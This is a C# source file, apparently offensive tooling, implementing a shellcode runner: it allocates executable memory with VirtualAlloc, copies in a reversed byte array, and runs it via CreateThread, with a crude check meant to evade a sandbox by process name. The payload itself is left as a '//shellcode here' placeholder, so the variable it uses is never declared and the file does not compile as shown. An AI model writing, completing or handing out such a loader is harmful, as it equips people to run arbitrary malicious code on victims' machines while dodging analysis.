using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace shellcode_runner
{
    class Program
    {
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        static void Main(string[] args)
        {
            var process_name = System.Diagnostics.Process.GetCurrentProcess();
            string teq = process_name.ProcessName;
            if (teq != "sandbox.exe")
            {
                string teq2 = process_name.ProcessName;
                if (teq2 == teq)
                {
                 //shellcode here
                Array.Reverse(shell_code);
                int size = shell_code.Length;
                IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
                Marshal.Copy(shell_code, 0, addr, size);
                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            else { Environment.Exit(0); }
            }
        }
    }
}
